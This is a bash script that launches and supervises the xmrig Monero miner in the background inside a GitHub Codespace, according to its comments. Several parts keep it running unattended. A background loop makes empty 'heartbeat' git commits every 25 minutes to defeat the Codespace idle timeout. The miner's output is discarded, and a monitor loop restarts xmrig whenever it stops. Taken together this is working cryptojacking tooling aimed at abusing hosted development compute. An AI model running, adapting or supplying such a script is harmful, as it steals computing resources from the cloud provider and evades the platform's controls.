#!/usr/bin/env bash
set -euo pipefail

echo "=== Miner Run Script ==="
echo "Started at $(date)"

# Anti-idle heartbeat (keeps Codespace alive)
(
  while true; do
    sleep 1500
    cd /workspaces/* 2>/dev/null || true
    git commit --allow-empty -m "heartbeat $(date +%s)" 2>/dev/null || true
  done
) &
echo "Heartbeat PID: $!"

# Wait for install to complete
for i in $(seq 1 30); do
  [ -f $HOME/moneroocean/xmrig ] && break
  echo "Waiting for xmrig binary... ($i/30)"
  sleep 5
done

if [ ! -f $HOME/moneroocean/xmrig ]; then
  echo "ERROR: xmrig binary not found after waiting"
  exit 1
fi

# Start miner in background
echo "[*] Starting miner in background"
/bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1

# Monitor loop: restart if it dies
echo "=== Starting monitor loop ==="
while true; do
  if ! pidof xmrig >/dev/null 2>&1; then
    echo "[$(date)] xmrig not running, restarting..."
    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
  fi
  sleep 30
done
